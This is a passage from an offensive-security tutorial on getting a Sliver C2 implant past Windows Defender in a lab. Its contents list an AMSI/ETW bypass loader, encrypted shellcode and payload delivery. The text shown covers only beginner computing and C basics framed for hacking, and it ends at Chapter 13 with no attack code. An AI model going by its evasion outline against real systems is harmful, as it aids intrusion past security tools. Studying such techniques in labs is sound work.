# INITIAL ACCESS WITH SLIVER C2
## Complete Guide - From Basics to Bypassing Windows Defender

---

# ABOUT THIS GUIDE

This guide teaches you how to run a Sliver implant on a Windows machine without Windows Defender catching it.

Before we do that, we need to learn how computers work. If you do not understand computers, you cannot understand hacking.

So we start from very basics. We go step by step. By the end, you will be able to:
- Understand what is happening inside the computer
- Write your own loader
- Bypass Defender
- Get shell on target machine

---

# YOUR LAB SETUP

| Computer | IP Address | What it is |
|----------|------------|------------|
| DC01 | 192.168.100.10 | Domain Controller (Windows Server) |
| WS01 | 192.168.100.20 | Target Computer (Windows 11 with Defender) |
| WS02 | 192.168.100.30 | Second Workstation (Windows 11) |
| Kali | 192.168.100.100| Your Attack Machine (Sliver is here) |

**Our Target:** WS01 (Windows 11 with Defender turned ON)

---

# TABLE OF CONTENTS

## [PART 1: HOW COMPUTERS STORE INFORMATION](#part-1-how-computers-store-information)
- [Chapter 1: What is Binary](#chapter-1-what-is-binary)
- [Chapter 2: What is a Byte](#chapter-2-what-is-a-byte)
- [Chapter 3: What is Hexadecimal](#chapter-3-what-is-hexadecimal)
- [Chapter 4: How Numbers are Stored](#chapter-4-how-numbers-are-stored-in-memory)
- [Chapter 5: How Text is Stored](#chapter-5-how-text-is-stored-in-memory)
- [Chapter 6: What is the Difference Between Data and Code](#chapter-6-the-difference-between-data-and-code)

## [PART 2: HOW PROGRAMS RUN](#part-2-how-programs-run)
- [Chapter 7: What Does the CPU Do](#chapter-7-what-does-the-cpu-do)
- [Chapter 8: What is Memory](#chapter-8-what-is-memory)
- [Chapter 9: What is the Stack](#chapter-9-what-is-the-stack)
- [Chapter 10: User Mode and Kernel Mode](#chapter-10-user-mode-and-kernel-mode)

## [PART 3: LEARNING C PROGRAMMING](#part-3-learning-c-programming)
- [Chapter 11: Setting Up C on Windows](#chapter-11-setting-up-c-on-windows)
- [Chapter 12: What is a Variable](#chapter-12-what-is-a-variable)
- [Chapter 13: What is a Pointer](#chapter-13-what-is-a-pointer)
- [Chapter 14: What is a Function](#chapter-14-what-is-a-function)
- [Chapter 15: Arrays and Strings](#chapter-15-arrays-and-strings)
- [Chapter 16: What is Buffer Overflow](#chapter-16-what-is-buffer-overflow)

## [PART 4: HOW SOURCE CODE BECOMES A PROGRAM](#part-4-how-source-code-becomes-a-program)
- [Chapter 17: What is Compilation](#chapter-17-what-is-compilation)
- [Chapter 18: What is Assembly Language](#chapter-18-what-is-assembly-language)
- [Chapter 19: What is PE File Format](#chapter-19-what-is-pe-file-format)
- [Chapter 20: How Windows Loads a Program](#chapter-20-how-windows-loads-a-program)

## [PART 5: WINDOWS INTERNALS](#part-5-windows-internals)
- [Chapter 21: What is a Process](#chapter-21-what-is-a-process)
- [Chapter 22: What is a Thread](#chapter-22-what-is-a-thread)
- [Chapter 23: What is Virtual Memory](#chapter-23-what-is-virtual-memory)
- [Chapter 24: What is Windows API](#chapter-24-what-is-windows-api)
- [Chapter 25: What is a DLL](#chapter-25-what-is-a-dll)

## [PART 6: SHELLCODE BASICS](#part-6-shellcode-basics)
- [Chapter 26: What is Shellcode](#chapter-26-what-is-shellcode)
- [Chapter 27: How Shellcode is Written](#chapter-27-how-shellcode-is-written)
- [Chapter 28: What is a Shellcode Loader](#chapter-28-what-is-a-shellcode-loader)
- [Chapter 29: What is Process Injection](#chapter-29-what-is-process-injection)

## [PART 7: INITIAL ACCESS - BYPASSING DEFENDER WITH SLIVER](#part-7-initial-access---bypassing-defender-with-sliver)
> This is the main attack section. We will:
> 1. Understand how Defender detects malware
> 2. Generate Sliver shellcode
> 3. Encrypt it to avoid signatures
> 4. Create a C# loader with AMSI/ETW bypass
> 5. Transfer to WS01 and get shell - WITHOUT disabling Defender!

- [Part 7.0: Cryptography Crash Course](#-part-70-cryptography-crash-course-the-fun-version)
- [Part 7.1: Setting Up Your Attacker Machine (Kali)](#-part-71-setting-up-your-attacker-machine-kali)
- [Part 7.2: Creating the Listener (HTTPS on port 443)](#-part-72-creating-the-listener)
- [Part 7.3: Generating Raw Shellcode](#-part-73-generating-raw-shellcode)
- [Part 7.4: Building the Custom Loader (AMSI/ETW Bypass)](#-part-74-building-the-custom-loader-the-magic-part)
- [Part 7.5: Encrypting Your Shellcode (XOR with Python)](#-part-75-encrypting-your-shellcode)
- [Part 7.6: Compiling the Loader (Mono C# Compiler)](#-part-76-compiling-the-loader)
- [Part 7.7: Hosting the Payload (Sliver Websites)](#-part-77-hosting-the-payload)
- [Part 7.8: Delivering to the Target](#-part-78-delivering-to-the-target)
- [Part 7.9: Receiving Your Shell](#-part-79-receiving-your-shell)
- [Part 7.10: Troubleshooting](#-part-710-troubleshooting)

## [PART 8: REFERENCE MATERIAL](#part-8-reference-material)
- [Chapter 36: Interview Questions](#chapter-36-interview-questions)
- [Chapter 37: Important Commands Cheatsheet](#chapter-37-important-commands-cheatsheet)
- [Chapter 38: Common Errors and Solutions](#chapter-38-common-errors-and-solutions)

---

# PART 1: HOW COMPUTERS STORE INFORMATION

---

# CHAPTER 1: What is Binary

## Introduction

Before we can understand hacking, we need to understand how computers store data.

Computers cannot understand words or numbers like we do. Computers only understand two things:
- OFF
- ON

We call OFF as **0**
We call ON as **1**

This is called **binary**. Everything in a computer is stored using only 0 and 1.

## How We Count Normally

In normal life, we count like this:

```
0, 1, 2, 3, 4, 5, 6, 7, 8, 9
```

When we reach 9, we have no more single digits. So we add one more place:

```
10, 11, 12, 13... and so on
```

We use 10 digits (0 to 9). This is called **decimal** system.

## How Computers Count

Computers only have 0 and 1. So they count differently.

```
0 = 0
1 = 1
```

Now what comes after 1? We have no more digits! So we add one more place:

```
10 = 2 (in decimal)
11 = 3 (in decimal)
```

Again no more options. Add one more place:

```
100 = 4 (in decimal)
101 = 5 (in decimal)
110 = 6 (in decimal)
111 = 7 (in decimal)
1000 = 8 (in decimal)
```

And so on.

## How to Read a Binary Number

Let me teach you a simple method.

Each position in binary has a value. Starting from the right:
- First position = 1
- Second position = 2
- Third position = 4
- Fourth position = 8
- Fifth position = 16
- Sixth position = 32
- Seventh position = 64
- Eighth position = 128

**See the pattern? Each position is double the previous one.**

## Example 1: What is 1011 in decimal?

Let us write the positions:

```
Position Values:    8    4    2    1
Binary Number:      1    0    1    1
```

Now add the values where binary has 1:
- 8 (yes, binary has 1)
- 4 (no, binary has 0)
- 2 (yes, binary has 1)
- 1 (yes, binary has 1)

Answer = 8 + 2 + 1 = **11**

So binary 1011 = decimal 11.

## Example 2: What is 11001 in decimal?

```
Position Values:   16    8    4    2    1
Binary Number:      1    1    0    0    1
```

Add where binary has 1:
- 16 (yes)
- 8 (yes)
- 4 (no)
- 2 (no)
- 1 (yes)

Answer = 16 + 8 + 1 = **25**

So binary 11001 = decimal 25.

## Example 3: How to Convert Decimal 50 to Binary

Now the opposite direction. We have 50 and want binary.

**Step 1:** Write position values that fit in 50

```
32    16    8    4    2    1
```

(64 is bigger than 50, so we stop at 32)

**Step 2:** Check which values fit

- Does 32 fit in 50? Yes. 50 - 32 = 18 left. Write 1.
- Does 16 fit in 18? Yes. 18 - 16 = 2 left. Write 1.
- Does 8 fit in 2? No. Write 0.
- Does 4 fit in 2? No. Write 0.
- Does 2 fit in 2? Yes. 2 - 2 = 0 left. Write 1.
- Does 1 fit in 0? No. Write 0.

**Step 3:** Read the binary number

```
32    16    8    4    2    1
 1     1    0    0    1    0
```

Answer: **110010**

Let us verify: 32 + 16 + 2 = 50 ✓

## Why is This Important?

Everything in a computer is binary:
- The letter 'A' is stored as binary
- The number 1000 is stored as binary
- Your password is stored as binary
- Shellcode is binary

When we encrypt or hide our payload, we are changing the binary. So you must understand it.

## Practice Problems

Try these yourself:

**Convert binary to decimal:**
1. 1010 = ?
2. 11111 = ?
3. 100000 = ?

**Convert decimal to binary:**
1. 20 = ?
2. 100 = ?
3. 255 = ?

## Answers

**Binary to decimal:**
1. 1010 = 8 + 2 = 10
2. 11111 = 16 + 8 + 4 + 2 + 1 = 31
3. 100000 = 32

**Decimal to binary:**
1. 20 = 10100 (16 + 4)
2. 100 = 1100100 (64 + 32 + 4)
3. 255 = 11111111 (128 + 64 + 32 + 16 + 8 + 4 + 2 + 1)

---

# CHAPTER 2: What is a Byte

## Introduction

One binary digit (0 or 1) is called a **bit**.

One bit can only store 2 values - either 0 or 1. That is not very useful.

So we group 8 bits together. This group of 8 bits is called a **byte**.

## How Many Values Can a Byte Store?

With 1 bit: 2 values (0 or 1)
With 2 bits: 4 values (00, 01, 10, 11)
With 3 bits: 8 values
With 4 bits: 16 values
With 5 bits: 32 values
With 6 bits: 64 values
With 7 bits: 128 values
With 8 bits: 256 values

**A byte can store 256 different values: from 0 to 255.**

## Example: The Byte Value 65

Let us see what 65 looks like in binary (as a byte).

First, position values for 8 bits:
```
128    64    32    16    8    4    2    1
```

65 = 64 + 1

So:
```
128    64    32    16    8    4    2    1
  0     1     0     0    0    0    0    1
```

The byte is: **01000001**

## Why 65 is Important

In computers, each letter is stored as a number. There is a standard list called **ASCII**.

In ASCII:
- 'A' = 65
- 'B' = 66
- 'C' = 67
- ... and so on

So when you type 'A' on keyboard, the computer stores 65 (which is 01000001 in binary).

## Some Important Byte Values

| Value | What It Means |
|-------|---------------|
| 0 | Often means "end" or "nothing" |
| 32 | Space character |
| 48 to 57 | Digits '0' to '9' |
| 65 to 90 | Capital letters 'A' to 'Z' |
| 97 to 122 | Small letters 'a' to 'z' |
| 255 | Maximum byte value |

## Bigger Numbers Need More Bytes

One byte can only store 0 to 255.

For bigger numbers, we use more bytes:

| Name | How Many Bytes | Can Store |
|------|----------------|-----------|
| Byte | 1 | 0 to 255 |
| Word | 2 | 0 to 65,535 |
| DWORD | 4 | 0 to about 4 billion |
| QWORD | 8 | 0 to very very big number |

When we program in C or call Windows API, we will see DWORD and QWORD many times.

---

# CHAPTER 3: What is Hexadecimal

## The Problem

Binary is hard to read. Look at this:

```
01001000 01100101 01101100 01101100 01101111
```

That is 5 bytes. Very hard to read.

Decimal (normal numbers) is easier: 72, 101, 108, 108, 111

But decimal is also not perfect. Sometimes one byte is 2 digits (72), sometimes 3 digits (255). Hard to line up.

## The Solution: Hexadecimal

Hexadecimal uses 16 digits instead of 10.

The 16 digits are: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, A, B, C, D, E, F

| Decimal | Hexadecimal |
|---------|-------------|
| 0 | 0 |
| 1 | 1 |
| 2 | 2 |
| ... | ... |
| 9 | 9 |
| 10 | A |
| 11 | B |
| 12 | C |
| 13 | D |
| 14 | E |
| 15 | F |

## Why Hexadecimal is Perfect for Bytes

One hex digit can show values 0 to 15.
In binary, that is 4 bits (0000 to 1111).

One byte is 8 bits.
So one byte is exactly 2 hex digits.

This is very clean:

| Decimal | Binary | Hexadecimal |
|---------|--------|-------------|
| 0 | 00000000 | 00 |
| 15 | 00001111 | 0F |
| 65 | 01000001 | 41 |
| 255 | 11111111 | FF |

Every byte is exactly 2 hex characters. Very easy to read.

## How to Read Hexadecimal

Hexadecimal is written with "0x" in front. So 0x41 means hexadecimal 41.

To convert 0x41 to decimal:
- First digit: 4
- Second digit: 1
- Value = (4 × 16) + (1 × 1) = 64 + 1 = 65

To convert 0xFF to decimal:
- First digit: F = 15
- Second digit: F = 15
- Value = (15 × 16) + (15 × 1) = 240 + 15 = 255

## Example: "Hello" in Hexadecimal

Each letter has a number (ASCII):
- H = 72 = 0x48
- e = 101 = 0x65
- l = 108 = 0x6C
- l = 108 = 0x6C
- o = 111 = 0x6F

So "Hello" in hex is: **48 65 6C 6C 6F**

This is what you see in hex editors and debuggers. Now you know how to read it.

## Where You Will See Hex

**Shellcode:**
```
\x48\x89\x5c\x24\x08
```
Each \x followed by 2 characters is one byte in hex.

**Memory addresses:**
```
0x00007FFE12340000
```

**In debuggers and tools:**
```
Address   Bytes                    Text
00000000  48 65 6C 6C 6F 00       Hello.
```

## Practice

**Convert hex to decimal:**
- 0x10 = ?
- 0x20 = ?
- 0x7F = ?

**Convert decimal to hex:**
- 16 = ?
- 100 = ?
- 200 = ?

## Answers

**Hex to decimal:**
- 0x10 = (1 × 16) + 0 = 16
- 0x20 = (2 × 16) + 0 = 32
- 0x7F = (7 × 16) + 15 = 112 + 15 = 127

**Decimal to hex:**
- 16 = 0x10
- 100 = 0x64 (100 ÷ 16 = 6 remainder 4)
- 200 = 0xC8 (200 ÷ 16 = 12 remainder 8, 12 = C)

---

---

# CHAPTER 4: How Numbers are Stored in Memory

## Introduction

Now we know what bytes are. But where do bytes live?

They live in **memory** (also called RAM).

Think of memory like a very long line of boxes. Each box can hold one byte. Each box has a number called its **address**.

```
Address:  0    1    2    3    4    5    6    7    ...
         [  ] [  ] [  ] [  ] [  ] [  ] [  ] [  ] ...
```

When we store something, we put bytes in these boxes.

## Storing a Small Number (0 to 255)

If the number is between 0 and 255, it fits in one byte.

**Example: Storing the number 42**

42 in binary is 00101010.

We put this in one box:

```
Address:  1000
         [00101010]  = 42
```

Simple!

## Storing a Bigger Number

But what if the number is bigger than 255?

**Example: Storing the number 1000**

1000 is bigger than 255, so it does not fit in one byte.

We need 2 bytes.

First, let us convert 1000 to binary:

1000 = 512 + 256 + 128 + 64 + 32 + 8 = ?

Wait, let me do it properly:
- 1000 ÷ 2 = 500, remainder 0
- 500 ÷ 2 = 250, remainder 0
- 250 ÷ 2 = 125, remainder 0
- 125 ÷ 2 = 62, remainder 1
- 62 ÷ 2 = 31, remainder 0
- 31 ÷ 2 = 15, remainder 1
- 15 ÷ 2 = 7, remainder 1
- 7 ÷ 2 = 3, remainder 1
- 3 ÷ 2 = 1, remainder 1
- 1 ÷ 2 = 0, remainder 1

Reading from bottom to top: 1111101000

That is 10 bits. We need at least 2 bytes (16 bits).

With padding: 0000001111101000

Split into 2 bytes:
- Byte 1: 00000011 = 0x03
- Byte 2: 11101000 = 0xE8

So 1000 in hex is 0x03E8.

## Little Endian: The Backward Order

Now, which byte do we store first?

On Intel/AMD computers (which is what we use), we store the **smaller part first**. This is called **little endian**.

So for 1000 (0x03E8):
- First box: E8 (the smaller/right part)
- Second box: 03 (the bigger/left part)

```
Address:  1000   1001
         [0xE8] [0x03]
```

This looks backward, but that is how Intel works.

## Why Little Endian Matters for Hacking

When you write an exploit and you want to put an address like 0x00401000 in memory, you must write it backward:

```
Address bytes: 00 40 10 00

In memory: 00 10 40 00  (reversed)
```

If you forget this, your exploit will not work.

## Common Number Sizes

| Name | Bytes | Range | Example Use |
|------|-------|-------|-------------|
| BYTE | 1 | 0-255 | Characters, small flags |
| WORD | 2 | 0-65535 | Port numbers |
| DWORD | 4 | 0 to 4 billion | Many Windows API values |
| QWORD | 8 | Very big | Memory addresses (64-bit) |

---

# CHAPTER 5: How Text is Stored in Memory

## Introduction

Now we know how numbers are stored. What about text?

The answer is simple: **text is also just numbers**.

Each letter has a number. This is called **ASCII** (American Standard Code for Information Interchange).

## The ASCII Table (Important Parts)

| Character | Decimal | Hex |
|-----------|---------|-----|
| (space) | 32 | 0x20 |
| 0 | 48 | 0x30 |
| 1 | 49 | 0x31 |
| 9 | 57 | 0x39 |
| A | 65 | 0x41 |
| B | 66 | 0x42 |
| Z | 90 | 0x5A |
| a | 97 | 0x61 |
| b | 98 | 0x62 |
| z | 122 | 0x7A |

**Notice:** Capital 'A' is 65. Small 'a' is 97. The difference is 32.

To change 'A' to 'a': add 32.
To change 'a' to 'A': subtract 32.

## Example: Storing "Hi" in Memory

The word "Hi":
- H = 72 = 0x48
- i = 105 = 0x69

In memory:

```
Address:  1000   1001
         [0x48] [0x69]
           H      i
```

## The Null Terminator

How does the computer know where a text ends?

Answer: We put a special byte at the end. This byte is **0** (zero). It is called the **null terminator** or **null byte**.

**Example: Storing "Hi" as a proper string**

```
Address:  1000   1001   1002
         [0x48] [0x69] [0x00]
           H      i    END
```

The 0x00 at the end tells the computer: "The string ends here."

## Why Null Terminator is Important for Hacking

Many programs read strings until they see 0x00.

If you can remove or overwrite the 0x00, the program will keep reading into other memory. This can cause:
- Information leak (reading data you should not see)
- Crash (reading invalid memory)
- Exploit opportunity

Also, if your shellcode contains 0x00 bytes, it might get cut off early. That is why we often need **null-free shellcode**.

## Example: Storing "Hello" in Memory

Let us trace exactly where each byte goes.

"Hello" in ASCII:
- H = 0x48
- e = 0x65
- l = 0x6C
- l = 0x6C
- o = 0x6F
- (null) = 0x00

```
Address:  1000   1001   1002   1003   1004   1005
         [0x48] [0x65] [0x6C] [0x6C] [0x6F] [0x00]
           H      e      l      l      o    END
```

Total: 6 bytes (5 for letters + 1 for null).

---

# CHAPTER 6: The Difference Between Data and Code

## Introduction

This is a very important chapter. Pay attention.

We have learned that computers store everything as bytes. Letters are bytes. Numbers are bytes.

But **code** (instructions for the computer) is also bytes.

So how does the computer know if bytes are data or code?

## The Answer: Context

The bytes themselves do not say "I am data" or "I am code".

The **location** and **how they are used** decides this.

Let me explain with an example.

## Example: The Byte 0x48

The byte 0x48 can mean different things:

**As text:** 0x48 = 72 = letter 'H'

**As code (on x64):** 0x48 is the "REX.W" prefix. It tells the CPU "the next instruction uses 64-bit size".

Same byte. Different meaning.

## How Does the Computer Decide?

When the CPU runs a program, it has a special pointer called the **Instruction Pointer** (IP or RIP on 64-bit).

This pointer says: "The next instruction is at this address."

The CPU reads bytes from that address and treats them as code.

If you can change where the instruction pointer points, you can make the CPU execute your own bytes as code.

## Example: Data Becoming Code

Imagine this memory:

```
Address:  1000   1001   1002   1003
Data:    [0x48] [0x65] [0x6C] [0x6C]  = "Hell"
```

Normally, this is just the text "Hell".

But if an attacker can make the instruction pointer point to address 1000, the CPU will try to execute these bytes as code.

0x48 0x65 means something in x64 assembly. The CPU will run it.

**This is the basic idea of shellcode.**

We put bytes in memory (maybe disguised as data or input). Then we make the CPU execute those bytes.

## Why This is Powerful

If you give a program input, you are putting bytes in its memory.

If you can also control the instruction pointer, those input bytes become code that runs.

This is how many exploits work:
1. Send special input (which is actually code in disguise)
2. Trigger a bug that changes the instruction pointer
3. The instruction pointer now points to your input
4. Your input runs as code
5. You have control

## What is Shellcode Then?

Shellcode is bytes that are designed to work as code.

When you create a Sliver implant, Sliver gives you shellcode - a sequence of bytes.

These bytes, when executed as code, will connect back to your C2 server.

Your job is to:
1. Get these bytes into the target's memory
2. Make the CPU execute them
3. Avoid detection while doing this

---

*End of Portion 2 - Chapters 4, 5, 6*

*What you learned:*
- *Numbers bigger than 255 use multiple bytes*
- *Intel computers store bytes in little endian (backward) order*
- *Text is stored as numbers using ASCII table*
- *Strings end with null byte (0x00)*
- *Same bytes can be data or code - it depends on how they are used*
- *Shellcode is bytes designed to run as code*

*Next portion: How programs actually run (CPU, memory, stack)*

---

# PART 2: HOW PROGRAMS RUN

---

# CHAPTER 7: What Does the CPU Do

## Introduction

The CPU (Central Processing Unit) is the brain of the computer.

But what does it actually do?

Very simple: **The CPU reads instructions and follows them. One by one.**

That is it. Nothing more.

## The Instruction Cycle

The CPU does only 3 things, over and over, billions of times per second:

1. **Fetch** - Get the next instruction from memory
2. **Decode** - Understand what the instruction says to do
3. **Execute** - Do what the instruction says

Then repeat with the next instruction.

## Example: Adding 5 + 3

Let us see how the CPU adds 5 + 3.

The instructions might be:
1. Put the number 5 in register A
2. Put the number 3 in register B
3. Add register A and register B, put result in register A
4. Done

The CPU will:
- **Fetch** instruction 1, **decode** it, **execute** it (now register A = 5)
- **Fetch** instruction 2, **decode** it, **execute** it (now register B = 3)
- **Fetch** instruction 3, **decode** it, **execute** it (now register A = 8)

## What are Registers?

Registers are tiny storage boxes **inside** the CPU itself.

Memory (RAM) is far from the CPU. Reading from memory is slow.

Registers are inside the CPU, so reading them is very fast.

The CPU does most work using registers, not memory directly.

**Important registers on x64 (64-bit Intel/AMD):**

| Register | Common Use |
|----------|------------|
| RAX | General purpose, return values from functions |
| RBX | General purpose |
| RCX | Counter, 1st function parameter (Windows) |
| RDX | 2nd function parameter (Windows) |
| RSI | Source index |
| RDI | Destination index |
| RSP | Stack pointer (top of stack) |
| RBP | Base pointer (bottom of stack frame) |
| R8-R15 | Additional general purpose |
| RIP | Instruction pointer (address of next instruction) |

## The Most Important Register: RIP

**RIP** (also called the instruction pointer) contains the address of the **next instruction** to execute.

Every time the CPU finishes an instruction, it looks at RIP to know where the next instruction is.

**This is critical for hacking.**

If you can change RIP, you control what the CPU does next.

When a buffer overflow overwrites a return address, it changes where RIP will point. The CPU then executes whatever is at that address - which could be your shellcode.

## How Fast is the CPU?

A modern CPU runs at about 3-4 GHz.

1 GHz = 1,000,000,000 cycles per second.

At 4 GHz, the CPU can do about 4 billion operations per second.

This is why computers seem instant - they are doing billions of things between your keystrokes.

---

# CHAPTER 8: What is Memory

## Introduction

We talked about memory earlier (where bytes live). Now let us understand it better.

## Memory is Just Numbered Boxes

Imagine billions of boxes in a line. Each box:
- Holds 1 byte (8 bits, value 0-255)
- Has an address (which box number it is)

```
Address:  0     1     2     3     4     5     ...
         [ ]   [ ]   [ ]   [ ]   [ ]   [ ]   ...
```

When we say "write to address 1000", we put a byte in box number 1000.

When we say "read from address 1000", we look at what is in box number 1000.

## How Big is Memory?

On a 64-bit system, addresses can be up to 64 bits (0 to 2^64 - 1).

But in practice, current CPUs use about 48 bits for addresses.

2^48 = 281,474,976,710,656 bytes = 256 TB (terabytes)

Your computer probably has 8-32 GB of RAM, which is much less. But the address space can be very large.

## Memory Addresses in Different Sizes

| Bits | Bytes | Max Address | Max Memory |
|------|-------|-------------|------------|
| 16 | 2 | 65,535 | 64 KB |
| 32 | 4 | 4,294,967,295 | 4 GB |
| 64 | 8 | Very big | 16 EB (theoretical) |

On 32-bit Windows, programs could only use about 2 GB of memory. This is why 64-bit systems are now standard.

## Reading and Writing Memory

The CPU can only do two things with memory:
1. **Read** - Get the value at an address
2. **Write** - Put a value at an address

That is it. Everything else is built from these two operations.

## Example: What Happens When You Run a Program

Let us say you open notepad.exe:

1. Windows reads notepad.exe from disk
2. Windows allocates memory for notepad (let us say addresses 1000 to 50000)
3. Windows copies notepad's code and data into that memory
4. Windows sets RIP to the starting address (let us say 1000)
5. CPU starts executing from address 1000
6. Notepad runs

When notepad closes, Windows frees that memory (addresses 1000-50000 become available again).

---

# CHAPTER 9: What is the Stack

## Introduction

When programs run, they need temporary storage. This is called the **stack**.

## Why Do Programs Need a Stack?

Think about this: You are running function A. Function A calls function B. Function B calls function C.

When C finishes, you need to go back to B. When B finishes, you need to go back to A.

How does the computer remember where to go back to?

Answer: The stack.

## How the Stack Works

The stack is a region of memory that grows and shrinks.

**Important rule:** Last in, first out (LIFO).

Think of a stack of plates:
- You put a plate on top (push)
- You take a plate from top (pop)
- You cannot take from the middle

## Push and Pop

**Push:** Add data to the top of the stack.

**Pop:** Remove data from the top of the stack.

## Example: Function Calls

Let us trace what happens:

```
Function A runs.
Function A calls Function B.
    - PUSH the return address (where to go back in A)
    - Jump to Function B
Function B runs.
Function B calls Function C.
    - PUSH the return address (where to go back in B)
    - Jump to Function C
Function C runs.
Function C finishes.
    - POP the return address (address in B)
    - Jump back to B
Function B finishes.
    - POP the return address (address in A)
    - Jump back to A
Function A continues.
```

The stack remembered the return addresses for us.

## What Else is on the Stack?

The stack stores:
- **Return addresses** - Where to go back after function ends
- **Local variables** - Variables created inside a function
- **Function parameters** - Values passed to a function
- **Saved registers** - Register values that need to be restored

## Stack Direction

On x86/x64, the stack grows **downward** (toward lower addresses).

When you push, the stack pointer (RSP) goes down.
When you pop, the stack pointer (RSP) goes up.

```
High Address
-----------------
| Old data      |
-----------------
| Return addr   |  ← Stack was here before call
-----------------
| Local vars    |  ← Stack is here now (lower address)
-----------------
Low Address
```

## Why the Stack is Important for Hacking

**Buffer Overflow Attack:**

If a local variable (like a buffer) is on the stack, and you write too much data into it, you can overwrite:
- Other local variables
- The saved return address

If you overwrite the return address with your own address, when the function returns, it will jump to YOUR address instead of the real one.

If your address points to shellcode, the shellcode runs.

This is the classic stack buffer overflow.

---

# CHAPTER 10: User Mode and Kernel Mode

## Introduction

Not all code has the same power.

The CPU can run in different modes. The two important ones are:
- **User Mode** - Normal programs run here (limited power)
- **Kernel Mode** - The operating system runs here (full power)

## Why Two Modes?

Imagine if any program could do anything:
- Delete any file
- Read any memory
- Control hardware directly
- Crash the whole computer

That would be dangerous. A buggy or malicious program could destroy everything.

So the CPU has restrictions.

## User Mode

When running in user mode:
- Cannot access hardware directly
- Cannot access other programs' memory (normally)
- Cannot run certain CPU instructions
- If something goes wrong, only that program crashes

Normal programs (browsers, notepad, your game) run in user mode.

## Kernel Mode

When running in kernel mode:
- Can access any memory
- Can control hardware
- Can run any instruction
- If something goes wrong, the whole computer crashes (Blue Screen)

The Windows kernel, drivers, and some security software run in kernel mode.

## How Programs Ask for Help

Since user mode programs cannot do many things directly, they ask the kernel to do it for them.

This is called a **system call** (or syscall).

**Example: Opening a file**

1. Your program (user mode) wants to open a file
2. Your program calls the Windows API function like CreateFile()
3. CreateFile() makes a syscall to the kernel
4. The kernel (kernel mode) actually opens the file
5. The result is returned to your program

## Why This Matters for Hacking

**Security software often runs in kernel mode.** They can see everything.

**Your shellcode runs in user mode.** It is limited.

But most attacks happen in user mode. You can still do a lot:
- Call Windows APIs
- Create files
- Make network connections
- Run commands
- Take screenshots

For EDR evasion, we often try to avoid the APIs that are monitored. Or we call the kernel directly (direct syscalls).

## User Mode to Kernel Mode Transition

When you make a syscall:

1. Your program is running in user mode
2. You trigger a syscall (special instruction)
3. CPU switches to kernel mode
4. Kernel handles the request
5. CPU switches back to user mode
6. Your program continues

The CPU has hardware support for this transition. It is fast and secure.

---

*End of Portion 3 - Chapters 7, 8, 9, 10*

*What you learned:*
- *CPU fetches, decodes, and executes instructions one by one*
- *RIP register points to the next instruction*
- *Memory is just numbered boxes that hold bytes*
- *Stack is temporary storage, grows downward, last-in-first-out*
- *User mode has limited power, kernel mode has full power*
- *Programs use syscalls to ask the kernel for help*

*Next portion: C Programming basics*

---

# PART 3: LEARNING C PROGRAMMING

---

# CHAPTER 11: Setting Up C on Windows

## Introduction

C is the programming language we will use to build our shellcode loader.

Why C?
- Windows is mostly written in C
- We can talk to Windows directly with C
- C gives us control over memory (which we need for shellcode)
- Most offensive tools are written in C

## What You Need

We need a C compiler. A compiler takes your code and turns it into an .exe file.

**Option 1: Visual Studio (Microsoft)**

This is the best option for Windows.

1. Download Visual Studio from: https://visualstudio.microsoft.com/
2. Select "Community" edition (free)
3. During install, select "Desktop development with C++"
4. This includes the C compiler (cl.exe)

**Option 2: MinGW (Simpler)**

If Visual Studio is too big:

1. Download MinGW from: https://www.mingw-w64.org/
2. Install it
3. This gives you gcc.exe (GNU C Compiler)

For this guide, I will show both ways.

## Your First C Program

Create a file called `hello.c` with this content:

```c
#include <stdio.h>

int main() {
    printf("Hello, I am learning C!\n");
    return 0;
}
```

## Compiling and Running

**With Visual Studio:**

Open "Developer Command Prompt for VS" and type:
```
cl hello.c
hello.exe
```

**With MinGW:**
```
gcc hello.c -o hello.exe
hello.exe
```

You should see:
```
Hello, I am learning C!
```

Congratulations! You wrote and ran your first C program.

## Understanding the Code

Let me explain each line:

```c
#include <stdio.h>
```
This line says "I want to use input/output functions". `printf` comes from here.

```c
int main() {
```
Every C program starts at `main()`. This is the entry point.

```c
    printf("Hello, I am learning C!\n");
```
This prints text to the screen. `\n` means new line.

```c
    return 0;
```
This tells Windows "the program finished successfully". 0 means success.

```c
}
```
This closes the main function.

---

# CHAPTER 12: What is a Variable

## Introduction

A variable is a named box in memory that holds a value.

## Example: Age Checker Program

Let us make a program that checks if someone can vote (age 18 or above).

```c
#include <stdio.h>

int main() {
    int age;           // Create a box called "age"
    
    age = 25;         // Put the number 25 in the box
    
    printf("Your age is: %d\n", age);
    
    if (age >= 18) {
        printf("You can vote!\n");
    } else {
        printf("You cannot vote yet.\n");
    }
    
    return 0;
}
```

Output:
```
Your age is: 25
You can vote!
```

## What Happened?

```c
int age;
```
This creates a box in memory. The box is named "age". The `int` means it holds whole numbers (integers).

```c
age = 25;
```
This puts the number 25 into the box.

```c
printf("Your age is: %d\n", age);
```
This prints the value inside the box. `%d` means "put a number here".

## Common Variable Types

| Type | What It Holds | Size | Range |
|------|---------------|------|-------|
| char | One character or small number | 1 byte | -128 to 127 |
| int | Whole numbers | 4 bytes | -2 billion to +2 billion |
| long | Bigger whole numbers | 8 bytes | Very big |
| float | Decimal numbers | 4 bytes | Numbers with decimal point |

## Example: Different Variable Types

```c
#include <stdio.h>

int main() {
    char letter = 'A';           // One character
    int count = 100;             // Whole number
    float price = 29.99;         // Decimal number
    
    printf("Letter: %c\n", letter);   // %c for character
    printf("Count: %d\n", count);     // %d for integer
    printf("Price: %.2f\n", price);   // %.2f for float with 2 decimals
    
    return 0;
}
```

Output:
```
Letter: A
Count: 100
Price: 29.99
```

## Example: Simple Calculator

```c
#include <stdio.h>

int main() {
    int a = 10;
    int b = 3;
    
    int sum = a + b;
    int difference = a - b;
    int product = a * b;
    int quotient = a / b;
    int remainder = a % b;   // % gives remainder
    
    printf("a = %d, b = %d\n", a, b);
    printf("Sum: %d\n", sum);
    printf("Difference: %d\n", difference);
    printf("Product: %d\n", product);
    printf("Quotient: %d\n", quotient);
    printf("Remainder: %d\n", remainder);
    
    return 0;
}
```

Output:
```
a = 10, b = 3
Sum: 13
Difference: 7
Product: 30
Quotient: 3
Remainder: 1
```

## Where Do Variables Live in Memory?

When you create a variable, it gets a memory address.

```c
#include <stdio.h>

int main() {
    int age = 25;
    
    printf("Value of age: %d\n", age);
    printf("Address of age: %p\n", &age);  // & gives address
    
    return 0;
}
```

Output (address will be different on your computer):
```
Value of age: 25
Address of age: 0x7fff5c3a2abc
```

The `&age` gives the memory address where age is stored. This is a hexadecimal number!

---

# CHAPTER 13: What is a Pointer

